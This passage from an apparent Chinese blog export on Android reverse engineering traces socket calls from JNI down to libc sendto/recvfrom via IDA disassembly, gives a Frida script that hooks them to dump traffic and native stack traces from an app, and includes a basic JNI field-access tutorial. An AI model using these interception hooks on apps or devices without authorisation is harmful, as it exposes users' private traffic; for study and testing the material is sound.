<img src="/2024/07/04/JNI%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240704211715193.png" class="" title="image-20240704211715193">

]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>Frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>JNI层Socket抓包与溯源</title>
    <url>/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/</url>
    <content><![CDATA[<p>之前几章分析了Java层的socket与SSL通信源码，了解了如何通过fridaHook抓取Java层的Socket和SSL通信</p>
<p>接下来两章通过对C层源码分析，了解如何抓取C层的通信</p>
<span id="more"></span>

<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Android：11.0</p>
<p>测试demo：使用系统框架层套接字进行通信</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607222130737.png" class="" title="image-20240607222130737">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607222200319.png" class="" title="image-20240607222200319">

<ul>
<li>根据抓包的结果可以看到使用Charles和wireshark都可以抓到包，但是使用我们的java层的hook脚本抓不到任何数据包。说明其没有使用Java层框架的API进行通信</li>
</ul>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h4 id="从之前分析到的JNI开始往下分析"><a href="#从之前分析到的JNI开始往下分析" class="headerlink" title="从之前分析到的JNI开始往下分析"></a>从之前分析到的JNI开始往下分析</h4><p>接下来我们从之前的JNI函数<strong>socketWrite0</strong>、<strong>socketRead0</strong>开始继续往下进入C层分析</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607102635904.png" class="" title="image-20240607102635904">

<p>在Android源码中的命名非常规范，直接搜索<strong>类名_函数名</strong>可以直接找到</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607103451902.png" class="" title="image-20240607103451902">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607103626937.png" class="" title="image-20240607103626937">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607224701528.png" class="" title="image-20240607224701528">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607224715476.png" class="" title="image-20240607224715476">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607224724936.png" class="" title="image-20240607224724936">

<ul>
<li><p>里面分别使用了<code>NET_Send</code>、<code>NET_Read</code>来进行后续的网络通信</p>
</li>
<li><p>它是一个JNI函数那么编译完之后自然就是一个SO库了</p>
</li>
<li><p>静态注册的JNI有自己的命名规则<strong>Java_包名_类名_自定义函数名_签名</strong>，根据这个函数的命名规范可以判断它不是静态注册的函数</p>
</li>
</ul>
<h4 id="so文件分析"><a href="#so文件分析" class="headerlink" title="so文件分析"></a>so文件分析</h4><p>找到源码生成的so文件，用IDA对其调用流程进行分析</p>
<blockquote>
<p>在源码中找到<code>SocketOutputStream.c</code>生成的so文件名字</p>
<p>之前编译源码的时候下载过Android11的源码，我们去源码中去找一下<code>SocketOutputStream.c</code>编译后的so文件应该叫什么名字</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607223144832.png" class="" title="image-20240607223144832">

<ul>
<li>从找到的信息中可以看到<code>SocketOutputStream.c</code>文件在Android11中会被编译成<strong>libopenjdk.so</strong>文件</li>
</ul>
<p>去设备中搜索一下这个文件pull下来用IDA分析</p>
<pre><code>adb shell
find / -name "libopenjdk.so" 2&gt;/dev/null
adb pull ***
</code></pre>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607225624015.png" class="" title="image-20240607225624015">
</blockquote>
<h4 id="用IDA分析libopenjdk找到hook点"><a href="#用IDA分析libopenjdk找到hook点" class="headerlink" title="用IDA分析libopenjdk找到hook点"></a>用IDA分析libopenjdk找到hook点</h4><img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240609170858933.png" class="" title="image-20240609170858933">

<ul>
<li>因为是动态函数，我们需要去<code>JNI_OnLoad</code>中查找，JNI_OnLoad()参数如果识别的不对的话手动修改一下<code>int __fastcall JNI_OnLoad(JavaVM *a1, void *a2)</code></li>
</ul>
<p>继续往下查看能看到对Java层输入、输出流函数的注册，先不管它</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607234534869.png" class="" title="image-20240607234534869">

<p>先直接在字符串中搜索，看能不能直接搜索到<code>SocketInputStream_socketRead0</code></p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607233558844.png" class="" title="image-20240607233558844">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240607233902230.png" class="" title="image-20240607233902230">

<ul>
<li>这里可以使用交叉引用直接定位到输入输出流函数</li>
</ul>
<p>找到了这两个函数的为止之后，看一下他们的调用图（Xrefs graph from）</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608102715357.png" class="" title="image-20240608102715357">

<blockquote>
<p>JNI:socketRead0 -&gt; j_NET_Read -&gt; NET_Read -&gt; recvfrom -&gt; __imp_recvfrom</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608104334305.png" class="" title="image-20240608104334305">

<ul>
<li><p>搜索这个函数可以看到最后调用的是<code>recvfrom</code>再往后就是got表了，所以等下可以选取<code>recvfrom</code>作为hook点</p>
<p><code>ssize_t recvfrom(int fd, void *buf, size_t n, int flags, struct sockaddr *addr, socklen_t *addr_len)</code></p>
</li>
</ul>
</blockquote>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608102721931.png" class="" title="image-20240608102721931">

<blockquote>
<p>JNI:socketWrite0 -&gt; j_NET_Send -&gt; NET_Send -&gt; sendto -&gt; __imp_sendto</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608104612759.png" class="" title="image-20240608104612759">

<ul>
<li><p>跟前面的一样，这里同样可以选择<code>sendto</code>作为hook点</p>
<p><code>ssize_t sendto(int fd, const void *buf, size_t n, int flags, const struct sockaddr *addr, socklen_t addr_len)</code></p>
<blockquote>
<p><strong>参数：</strong></p>
<p>**<code>int fd</code>**：这是一个文件描述符，它表示要发送数据的套接字。在网络编程中，套接字是一个抽象的网络通信端点，它可以是一个监听套接字（用于接受连接），也可以是一个已连接套接字（用于与远程主机进行通信）。在 <code>sendto</code> 中，<code>fd</code> 表示的是要向其发送数据的套接字。</p>
<p>**<code>const void \*buf</code>**：这是一个指向数据缓冲区的指针，其中包含要发送的数据。<code>buf</code> 是一个 <code>void</code> 类型的指针，这意味着它可以指向任何类型的数据。发送的数据通常是一个字节数组，可以是文本、二进制数据等等。</p>
<p>**<code>size_t n</code>**：这是一个 <code>size_t</code> 类型的参数，表示要发送的数据的大小（字节数）。<code>size_t</code> 是无符号整数类型，它的大小通常与系统的地址位数相同，用于表示内存中对象的大小。在 <code>sendto</code> 中，<code>n</code> 表示要发送的数据的字节数。</p>
<p>**<code>int flags</code>**：这是一个整数参数，用于指定发送操作的标志。<code>flags</code> 参数通常用于控制发送操作的行为，比如设置发送的方式（阻塞或非阻塞）、设置发送的优先级等。</p>
<p>**<code>const struct sockaddr \*addr</code>**：这是一个指向目标地址信息结构体的指针，用于指定要发送数据的目标地址。在网络编程中，<code>sockaddr</code> 结构体用于表示网络地址信息，它包含了目标主机的 IP 地址和端口号等信息。</p>
<p>**<code>socklen_t addr_len</code>**：这是一个 <code>socklen_t</code> 类型的参数，表示目标地址结构体的大小（字节数）。<code>socklen_t</code> 是一个整数类型，用于表示套接字地址结构体的长度。在 <code>sendto</code> 中，<code>addr_len</code> 表示目标地址结构体的实际大小。</p>
<p><strong>返回值：</strong></p>
<p>返回值如果是负值表示发送错误，如果发送成功，返回值就是发送的字节数。</p>
</blockquote>
</li>
</ul>
</blockquote>
<ul>
<li>根据调用图可以很清晰的看到其中接收和发送数据都调用了哪些函数</li>
<li><code>recvfrom</code>和<code>sendto</code>的参数类型都一样不进行重复解释了</li>
</ul>
<p><code>recvfrom</code>和<code>sendto</code>都是来自libc.so的，可以也pull下来继续分析。（不感兴趣不分析也行，已经找到hook点了）</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608105231002.png" class="" title="image-20240608105231002">

<h4 id="分析libc-so了解怎么进入系统调用"><a href="#分析libc-so了解怎么进入系统调用" class="headerlink" title="分析libc.so了解怎么进入系统调用"></a>分析libc.so了解怎么进入系统调用</h4><p>这里简单介绍一下libc.so</p>
<blockquote>
<p><code>libc.so</code> 是 Android 系统中的标准 C 库，提供了 C 语言标准库函数和 POSIX 标准函数的实现。它是 Android 平台上的核心库之一，提供基本的系统调用和底层操作支持，包括内存管理、文件操作、线程管理、网络通信等。</p>
</blockquote>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608110114232.png" class="" title="image-20240608110114232">

<ul>
<li>既然能被调用，它们自然是导出函数。可以直接被搜索到</li>
</ul>
<h5 id="recvFrom"><a href="#recvFrom" class="headerlink" title="recvFrom"></a>recvFrom</h5><img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608120030118.png" class="" title="image-20240608120030118">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608125804037.png" class="" title="image-20240608125804037">

<pre><code class="armasm">.text:000716B0                               ; unsigned int __fastcall recvfrom(int, void *, size_t, int)	// 函数原型有四个参数
.text:000716B0                               EXPORT recvfrom
.text:000716B0                               recvfrom                                ; CODE XREF: j_recvfrom+8↓j
.text:000716B0                                                                       ; DATA XREF: LOAD:000064FC↑o
.text:000716B0                                                                       ; .got.plt:off_8B280↓o
.text:000716B0                               ; __unwind {
.text:000716B0 0D C0 A0 E1                   MOV             R12, SP		// 将当前的堆栈指针保存到寄存器R12中。R12寄存器在ARM EABI中有时被称为IP（临时寄存器，作为函数调用过程中的临时寄存器）
.text:000716B4 F0 00 2D E9                   PUSH            {R4-R7}		// 将寄存器R4~R7的值压入堆栈。在调用结束后方便恢复堆栈
.text:000716B8 70 00 9C E8                   LDM             R12, {R4-R6}	// 从R12（SP）开始取出R4、R5、R6的值存储在这三个寄存器中作为参数
.text:000716BC 49 7F A0 E3                   MOV             R7, #292		// 将系统调用号 292（即 __NR_recvfrom 的值）存储到 R7 中。R7 在 ARM 系统调用约定中用于存储系统调用号
.text:000716C0 00 00 00 EF                   SVC             0				// 触发一个软中断（Supervisor Call），使处理器进入内核模式执行系统调用。此时，寄存器 R0 到 R6 的值将作为参数传递给系统调用，R7 则作为系统调用号
.text:000716C4 F0 00 BD E8                   POP             {R4-R7}		// 恢复堆栈现场
.text:000716C8 01 0A 70 E3                   CMN             R0, #0x1000	// 比较 R0 的值与 0x1000。CMN 指令实际上是执行 R0 + 0x1000 并设置条件标志
.text:000716CC 1E FF 2F 91                   BXLS            LR				// 如果 R0 小于 0x1000（即系统调用成功），则跳转到 LR（返回地址），结束函数执行
.text:000716CC
.text:000716D0 00 00 60 E2                   RSB             R0, R0, #0		// 如果系统调用失败（R0 &gt;= 0x1000），将 R0 的值取负（相当于 R0 = 0 - R0）。此步骤转换错误码为负值
.text:000716D4 A5 51 00 EA                   B               __ARMV7PILongThunk___set_errno_internal	// 跳转到错误处理函数 __ARMV7PILongThunk___set_errno_internal，设置 errno
.text:000716D4                               ; } // starts at 716B0
</code></pre>
<ul>
<li>这段汇编执行了系统调用（recvfrom）并处理返回值，根据返回结果看是处理错误还是直接返回</li>
</ul>
<h5 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h5><img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608120134184.png" class="" title="image-20240608120134184">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240608125942213.png" class="" title="image-20240608125942213">

<pre><code class="armasm">.text:00071688                               ; unsigned int __fastcall _sendto(int, const void *, size_t, int)
.text:00071688                               __sendto                                ; CODE XREF: sendto+E↑j
.text:00071688                                                                       ; DATA XREF: sendto+6↑o
.text:00071688                                                                       ; .data:off_8CB70↓o
.text:00071688                               ; __unwind {
.text:00071688 0D C0 A0 E1                   MOV             R12, SP		// 保存堆栈指针
.text:0007168C F0 00 2D E9                   PUSH            {R4-R7}		// 保存寄存器值
.text:00071690 70 00 9C E8                   LDM             R12, {R4-R6}	// 加载函数参数
.text:00071694 22 71 00 E3                   MOVW            R7, #0x122		// 设置系统调用号（系统调用号 290，对应 sendto）
.text:00071698 00 00 00 EF                   SVC             0				// 发起系统调用
.text:0007169C F0 00 BD E8                   POP             {R4-R7}		// 恢复寄存器值
.text:000716A0 01 0A 70 E3                   CMN             R0, #0x1000	
.text:000716A4 1E FF 2F 91                   BXLS            LR				// 检查返回值
.text:000716A4
.text:000716A8 00 00 60 E2                   RSB             R0, R0, #0
.text:000716AC AF 51 00 EA                   B               __ARMV7PILongThunk___set_errno_internal	// 错误处理
.text:000716AC                               ; } // starts at 71688
.text:000716AC
.text:000716AC                               ; End of function __sendto
</code></pre>
<ul>
<li>这段汇编实现了一个 <code>_sendto</code> 函数，通过系统调用 <code>sendto</code> 向网络套接字发送数据</li>
</ul>
<p>通过对<code>libc.so</code>的分析，知道了在libc中是怎么通过系统调用号配合软中断进入内核的</p>
<h3 id="Frida-Hook脚本编写"><a href="#Frida-Hook脚本编写" class="headerlink" title="Frida-Hook脚本编写"></a>Frida-Hook脚本编写</h3><p>以上就是数据接收和发送从JNI到C层所经过的API，以及最后是如何发起系统调用，交给内核进行处理的</p>
<p>之前我们写的java层的hook代码，可以拦截到使用Java层框架API完成通信的抓包，并且可以很方便的打印出调用堆栈。但是对于像我们这次的demo中直接使用系统函数<code>send</code>、<code>recv</code>进行通信的方式无法拦截。</p>
<p>接下来我们写一个对SO层的hook，来hook<code>libc.so</code>中的<code>sendto</code>、<code>recvFrom</code>抓取数据包并打印SO层的调用栈</p>
<pre><code class="js">function LogPrint(log) {
    var theDate = new Date();
    var time = theDate.toISOString().split('T')[1].replace('Z', '');
    var threadid = Process.getCurrentThreadId();
    console.log(`[${time}] -&gt; threadid:${threadid} -- ${log}`);
}

function isprintable(value) {
    return value &gt;= 32 &amp;&amp; value &lt;= 126;
}

// 使用frida提供的工具解析socket获取IP和port
function getsocketdetail(fd) {
    var type = Socket.type(fd);
    if (type !== null) {
        var peer = Socket.peerAddress(fd);
        var local = Socket.localAddress(fd);
        return `type:${type}, address:${JSON.stringify(peer)}, local:${JSON.stringify(local)}`;
    }
    return "unknown";
}

function hooklibc() {
    var libcmodule = Process.getModuleByName("libc.so");
    var recvfrom_addr = libcmodule.getExportByName("recvfrom");
    var sendto_addr = libcmodule.getExportByName("sendto");
    console.log(recvfrom_addr + "---" + sendto_addr);
    
    // ssize_t recvfrom(int fd, void *buf, size_t n, int flags, struct sockaddr *addr, socklen_t *addr_len)
    Interceptor.attach(recvfrom_addr, {
        onEnter: function (args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];
            this.arg4 = args[4];

            LogPrint("go into libc.so-&gt;recvfrom");

        }, onLeave: function (retval) {
            var size = this.arg2.toInt32();
            if (size &gt; 0) {
                var result = getsocketdetail(this.arg0.toInt32());
                console.log(result + "---libc.so-&gt;recvfrom:" + hexdump(this.arg1, {
                    length: size
                }));
            }

            LogPrint("leave libc.so-&gt;recvfrom");
        }
    });

    // ssize_t sendto(int fd, const void *buf, size_t n, int flags, const struct sockaddr *addr, socklen_t addr_len)
    Interceptor.attach(sendto_addr, {
        onEnter: function (args) {
            this.arg0 = args[0];
            this.arg1 = args[1];
            this.arg2 = args[2];
            this.arg4 = args[4];

            LogPrint("go into libc.so-&gt;sendto");
        }, onLeave: function (retval) {
            var size = this.arg2.toInt32();
            if (size &gt; 0) {
                var result = getsocketdetail(this.arg0.toInt32());
                console.log(result + "---libc.so-&gt;sendto:" + hexdump(this.arg1, {
                    length: size
                }));
            }

            LogPrint("leave libc.so-&gt;sendto");
        }
    });
}

function main() {
    hooklibc();
}

setImmediate(main);
</code></pre>
<blockquote>
<p>IP和port解析</p>
<p><code>ssize_t sendto(int fd, const void *buf, size_t n, int flags, const struct sockaddr *addr, socklen_t addr_len)</code></p>
<p>socket有ID或者叫句柄。对于<code>sendto</code>、<code>recvfrom</code>来说它的第一个参数就是socket的ID，所以可以通过解析这个ID来得到通信对端的IP和port。</p>
<p>在<a href="https://frida.re/docs/javascript-api/#socket">Frida中有相关的API</a>可以来对ID进行解析</p>
</blockquote>
<p>抓包结果：</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240609101052882.png" class="" title="image-20240609101052882">

<h4 id="添加栈回溯信息"><a href="#添加栈回溯信息" class="headerlink" title="添加栈回溯信息"></a>添加栈回溯信息</h4><p>使用frida的Thread功能打印当前线程的栈回溯信息，这里用腾讯新闻的App作为例子抓包试一下</p>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240609101845491.png" class="" title="image-20240609101845491">

<pre><code class="js">function printNativeStack(context, name) {
    var trace = Thread.backtrace(context, Backtracer.ACCURATE).map(DebugSymbol.fromAddress).join("\n");
    LogPrint("-----------start:" + name + "--------------");
    LogPrint(trace);
    LogPrint("-----------end:" + name + "--------------");

}
</code></pre>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240612235818564.png" class="" title="image-20240612235818564">

<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240613000706891.png" class="" title="image-20240613000706891">

<ul>
<li>成功的打印出了函数调用流程</li>
<li>不过结果中有一些采用UDP通信的IP是null，没有解析出来</li>
</ul>
<h4 id="解析UDP通信的IP"><a href="#解析UDP通信的IP" class="headerlink" title="解析UDP通信的IP"></a>解析UDP通信的IP</h4><pre><code class="js">function getip(ip_ptr) {
    return Array.from({ length: 4 }, (_, i) =&gt; ptr(ip_ptr.add(i)).readU8()).join('.');
}

function getUdpAddr(addrptr) {
    var port = addrptr.add(2).readU16();
    var ip_addr = getip(addrptr.add(4));
    return `peer:${ip_addr}--port:${port}`;
}

function handleUdp(socketType, sockaddr_in_ptr, sizeofsockaddr_in) {
    var addr_info = getUdpAddr(sockaddr_in_ptr);
    console.log(`this is a ${socketType} udp! -&gt; ${addr_info} --- size of sockaddr_in: ${sizeofsockaddr_in}`);
}
</code></pre>
<img src="/2024/07/04/JNI%E5%B1%82Socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240613001859925.png" class="" title="image-20240613001859925">

<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>本章完成了对SO库函数的socket抓包，包括打印IP以及C层堆栈调用。</p>
<p>如果需要打印Java层的堆栈调用，还是需要使用之前写的Java层的hook脚本</p>
<h6 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h6><p><a href="https://github.com/xiaoeeyu/hookLibcSocket">完整fridaHook脚本</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>Frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>JNI新建对象和访问Java中属性</title>
    <url>/2023/10/13/JNI%E6%96%B0%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E8%AE%BF%E9%97%AEJava%E4%B8%AD%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[<p>本章主要写代码测试在JNI中使用JNIEnv提供的接口，创建Java对象以及访问Java类中的属性(静态属性、非静态属性、数组)</p>
<span id="more"></span>

<h2 id="JNI中创建Java对象"><a href="#JNI中创建Java对象" class="headerlink" title="JNI中创建Java对象"></a>JNI中创建Java对象</h2><img src="/2023/10/13/JNI%E6%96%B0%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E8%AE%BF%E9%97%AEJava%E4%B8%AD%E5%B1%9E%E6%80%A7/image-20231013232950958.png" class="" title="image-20231013232950958">

<ul>
<li>使用NewObject()和AllocObject()两种方式创建JAVA对象</li>
</ul>
<pre><code class="C++">extern "C"
JNIEXPORT void JNICALL
Java_com_xiaoeryu_reflectiontest_MainActivity_newObject(JNIEnv *env, jobject thiz) {
    // TODO: implement newObject()
    // 使用函数NewObject来创建JAVA对象
    jclass TestJclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    // public Test(String arg)
    jmethodID con_mid = env-&gt;GetMethodID(TestJclass, "&lt;init&gt;", "(Ljava/lang/String;)V");
    jstring arg = env-&gt;NewStringUTF("I am From jni");
    // jobject NewObject(jclass clazz, jmethodID methodID, ...)
    jobject testobj = env-&gt;NewObject(TestJclass, con_mid, arg);
    if (testobj != nullptr){
        __android_log_print(4, "xiaoeryu-&gt;jni", "jni-&gt;%s", "NewObject success!");
    }

    // AllocObject
    jobject testobj1 = env-&gt;AllocObject(TestJclass);
    jstring arg1 = env-&gt;NewStringUTF("I am From Jni-&gt;AllocObject");
    env-&gt;CallNonvirtualVoidMethod(testobj1, TestJclass, con_mid, arg1);
    if (testobj1 != nullptr){
        __android_log_print(4, "xiaoeryu-&gt;jni", "jni-&gt;%s", "AllocObject success!");
    }
}
</code></pre>
<blockquote>
<p>JNI获取Java中的构造函数的时候，函数名写<init></init></p>
</blockquote>
<h2 id="JNI中访问类对象属性"><a href="#JNI中访问类对象属性" class="headerlink" title="JNI中访问类对象属性"></a>JNI中访问类对象属性</h2><blockquote>
<p>Java中有public和private</p>
<p>在JNI中只分静态属性和非静态属性</p>
</blockquote>
<h3 id="Static属性"><a href="#Static属性" class="headerlink" title="Static属性"></a>Static属性</h3><h4 id="获取Static属性"><a href="#获取Static属性" class="headerlink" title="获取Static属性"></a>获取Static属性</h4><ul>
<li>获取静态属性接口（有八种基础数据类型+一种引用数据类型）</li>
</ul>
<pre><code class="C++">    jobject GetStaticObjectField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticObjectField(this, clazz, fieldID); }
    jboolean GetStaticBooleanField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticBooleanField(this, clazz, fieldID); }
    jbyte GetStaticByteField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticByteField(this, clazz, fieldID); }
    jchar GetStaticCharField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticCharField(this, clazz, fieldID); }
    jshort GetStaticShortField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticShortField(this, clazz, fieldID); }
    jint GetStaticIntField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticIntField(this, clazz, fieldID); }
    jlong GetStaticLongField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticLongField(this, clazz, fieldID); }
    jfloat GetStaticFloatField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticFloatField(this, clazz, fieldID); }
    jdouble GetStaticDoubleField(jclass clazz, jfieldID fieldID)
    { return functions-&gt;GetStaticDoubleField(this, clazz, fieldID); }
</code></pre>
<ul>
<li>获取静态属性code</li>
</ul>
<pre><code class="C++">extern "C"
JNIEXPORT void JNICALL
Java_com_xiaoeryu_reflectiontest_MainActivity_getStaticField(JNIEnv *env, jobject thiz) {
// public static
    jclass TestJclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    // public static String publicStaticField = "i am a public StaticField";
    jfieldID publicStaticField_id = env-&gt;GetStaticFieldID(TestJclass, "publicStaticField", "Ljava/lang/String;");
    jstring publicStaticField_obj = static_cast&lt;jstring&gt;(env-&gt;GetStaticObjectField(TestJclass, publicStaticField_id));
    const char *publicStaticField_content = env-&gt;GetStringUTFChars(publicStaticField_obj, nullptr);

    __android_log_print(4, "xiaoeryu-&gt;jni", "publicStaticField_obj_jni-&gt;%s", publicStaticField_content);

    // private static String priviteStaticField = "i am a private StaticField";
    jfieldID privateStaticField_id = env-&gt;GetStaticFieldID(TestJclass, "priviteStaticField", "Ljava/lang/String;");
    jstring privateStaticField_obj = static_cast&lt;jstring&gt;(env-&gt;GetStaticObjectField(TestJclass, privateStaticField_id));
    const char *privateStaticField_content = env-&gt;GetStringUTFChars(privateStaticField_obj, nullptr);

    __android_log_print(4, "xiaoeryu-&gt;jni", "privateStaticField_obj_jni-&gt;%s", privateStaticField_content);

    // public static int publicStaticField_int = 100;
    jfieldID publicStaticField_int_id = env-&gt;GetStaticFieldID(TestJclass, "publicStaticField_int", "I");
    jint publicStaticField_int_value = env-&gt;GetStaticIntField(TestJclass, publicStaticField_int_id);

    __android_log_print(4, "xiaoeryu-&gt;jni", "publicStaticField_int_value_jni-&gt;%d", publicStaticField_int_value);
}
</code></pre>
<blockquote>
<p>在native中访问java类中的私有静态属性需不需要修改权限都可以直接获取，在获取不同类型数据的时候换不同的接口就行例如<code>GetStaticFieldID/GetStaticIntField</code>等</p>
</blockquote>
<h4 id="设置Static属性"><a href="#设置Static属性" class="headerlink" title="设置Static属性"></a>设置Static属性</h4><ul>
<li>设置静态类属性接口</li>
</ul>
<pre><code class="C++">    void SetStaticObjectField(jclass clazz, jfieldID fieldID, jobject value)
    { functions-&gt;SetStaticObjectField(this, clazz, fieldID, value); }
    void SetStaticBooleanField(jclass clazz, jfieldID fieldID, jboolean value)
    { functions-&gt;SetStaticBooleanField(this, clazz, fieldID, value); }
    void SetStaticByteField(jclass clazz, jfieldID fieldID, jbyte value)
    { functions-&gt;SetStaticByteField(this, clazz, fieldID, value); }
    void SetStaticCharField(jclass clazz, jfieldID fieldID, jchar value)
    { functions-&gt;SetStaticCharField(this, clazz, fieldID, value); }
    void SetStaticShortField(jclass clazz, jfieldID fieldID, jshort value)
    { functions-&gt;SetStaticShortField(this, clazz, fieldID, value); }
    void SetStaticIntField(jclass clazz, jfieldID fieldID, jint value)
    { functions-&gt;SetStaticIntField(this, clazz, fieldID, value); }
    void SetStaticLongField(jclass clazz, jfieldID fieldID, jlong value)
    { functions-&gt;SetStaticLongField(this, clazz, fieldID, value); }
    void SetStaticFloatField(jclass clazz, jfieldID fieldID, jfloat value)
    { functions-&gt;SetStaticFloatField(this, clazz, fieldID, value); }
    void SetStaticDoubleField(jclass clazz, jfieldID fieldID, jdouble value)
    { functions-&gt;SetStaticDoubleField(this, clazz, fieldID, value); }
</code></pre>
<p>设置静态属性code</p>
<pre><code class="C++">    jclass TestJclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    jfieldID publicStaticField_id = env-&gt;GetStaticFieldID(TestJclass, "publicStaticField", "Ljava/lang/String;");

    jstring setjstring = env-&gt;NewStringUTF("modified by jni");
    env-&gt;SetStaticObjectField(TestJclass, publicStaticField_id, setjstring);
    jstring publicStaticField_obj = static_cast&lt;jstring&gt;(env-&gt;GetStaticObjectField(TestJclass, publicStaticField_id));
...
    // public static int publicStaticField_int = 100;
    jfieldID publicStaticField_int_id = env-&gt;GetStaticFieldID(TestJclass, "publicStaticField_int", "I");

    // void SetStaticIntField(jclass clazz, jfieldID fieldID, jint value)
    env-&gt;SetStaticIntField(TestJclass, publicStaticField_int_id, 20);

    jint publicStaticField_int_value = env-&gt;GetStaticIntField(TestJclass, publicStaticField_int_id);

    __android_log_print(4, "xiaoeryu-&gt;jni", "publicStaticField_int_value_jni-&gt;%d", publicStaticField_int_value);
</code></pre>
